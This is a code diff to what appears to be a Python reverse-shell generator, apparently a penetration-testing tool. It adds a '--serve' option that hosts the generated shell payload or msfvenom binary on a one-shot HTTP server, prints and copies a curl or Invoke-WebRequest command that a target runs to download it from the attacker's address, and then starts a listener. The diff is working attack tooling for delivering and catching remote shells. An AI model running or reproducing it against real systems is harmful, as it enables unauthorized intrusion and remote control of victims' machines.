@@ -2,12 +2,15 @@
 
 from base64 import b64encode
 from fcntl import ioctl
-from os import getcwd
+from os import getcwd, path
+from random import randint
 from struct import pack
 
 import argparse
+import http.server
 import re
 import socket
+import socketserver
 import subprocess
 import sys
 
@@ -36,6 +39,11 @@ def parse_options():
                         action="store_true",
                         help="Start a listener",
                         dest="shell_listen")
+    parser.add_argument("-s",
+                        "--serve",
+                        action="store_true",
+                        help="Serve reverse shell",
+                        dest="shell_serve")
     args = parser.parse_args()
 
     if (args.shell_type == None) ^ args.shell_list:
@@ -59,7 +67,7 @@ def get_ip(ip_iface: str) -> str:
                 0x8915,  # SIOCGIFADDR
                 pack('256s', ip_iface[:15].encode()))[20:24])
         return ip_iface
-    except Exception as e:
+    except Exception:
         pass
 
     # Check if valid domain
@@ -523,6 +531,30 @@ def generate_msf(command: str) -> str:
     return command.split(" -o ")[1]
 
 
+def serve_reverse(ipaddr: str, port: int, file_path: str) -> None:
+
+    class SingleRequestHandler(http.server.SimpleHTTPRequestHandler):
+
+        def translate_path(self, _):
+            return file_path
+
+        def log_message(self, *_):
+            print(f"[+] File {path.basename(file_path)} downloaded!")
+
+        def finish(self):
+            self.connection.close()
+
+    with socketserver.TCPServer((ipaddr, port), SingleRequestHandler, False) as httpd:
+        httpd.allow_reuse_address = True
+        httpd.server_bind()
+        httpd.server_activate()
+
+        try:
+            httpd.handle_request()
+        except KeyboardInterrupt:
+            pass
+
+
 def run_listener(command: str) -> None:
     try:
         process = subprocess.Popen(command, shell=True)
@@ -557,29 +589,59 @@ def main(args: argparse.Namespace) -> None:
     # Reverse shell
     print("[*] Generated reverse shell")
 
+    file_path = ""
     if shell['type'] == 1:
+        # Copy reverse shell to clipboard
         copy_clipboard(shell['reverse'])
         print("[+] Contents copied to clipboard")
     elif shell['type'] == 2:
-        path = generate_msf(shell['reverse'])
-        path = f"{getcwd()}/{path}"
-        copy_clipboard(path)
-        print(f"[+] Path {path} copied to clipboard")
+        # Generate binary and copy path to clipboard
+        file_path = generate_msf(shell['reverse'])
+        file_path = f"{getcwd()}/{file_path}"
+        copy_clipboard(file_path)
+        print(f"[+] Path {file_path} copied to clipboard")
     else:
-        path = f"{getcwd()}/reverse.{shell['type']}"
-        with open(path, 'w') as f:
+        # Write reverse shell to file
+        file_path = f"{getcwd()}/reverse.{shell['type']}"
+        with open(file_path, 'w') as f:
             f.write(shell['reverse'])
 
-        copy_clipboard(path)
-        print(f"[+] Path {path} copied to clipboard")
+        copy_clipboard(file_path)
+        print(f"[+] Path {file_path} copied to clipboard")
 
     print(shell['reverse'])
+
+    # Serve file on web
+    if shell['type'] != 1 and args.shell_serve:
+        serve_port = randint(8000, 9000)
+
+        print(f"\n[+] Web server serving on {serve_port}")
+
+        # Horrible mess that prints and copies the command to get the file
+        if shell['platform'] == "Linux":
+            download_cmd = f"curl -fsSL http://{ipaddr}:{serve_port} -o {path.basename(file_path)}"
+            copy_clipboard(download_cmd)
+            print("[+] Command copied to clipboard")
+            print(download_cmd)
+        elif shell['platform'] == "Windows":
+            download_cmd = f"Invoke-WebRequest -Uri http://{ipaddr}:{serve_port} -OutFile {path.basename(file_path)}"
+            print("[+] Command copied to clipboard")
+            copy_clipboard(download_cmd)
+            print(download_cmd)
+        else:
+            print(f"curl -fsSL http://{ipaddr}:{serve_port} -o {path.basename(file_path)}")
+            print(
+                f"Invoke-WebRequest -Uri http://{ipaddr}:{serve_port} -OutFile {path.basename(file_path)}"
+            )
+
+        serve_reverse(ipaddr, serve_port, file_path)
 
     # Listener
     print("\n[*] Start listener")
     print(shell["listen"])
 
     if args.shell_listen:
+        # Starts an interactive listener
         print(f"\n[+] Listening on {port}")
         run_listener(shell["listen"])
 
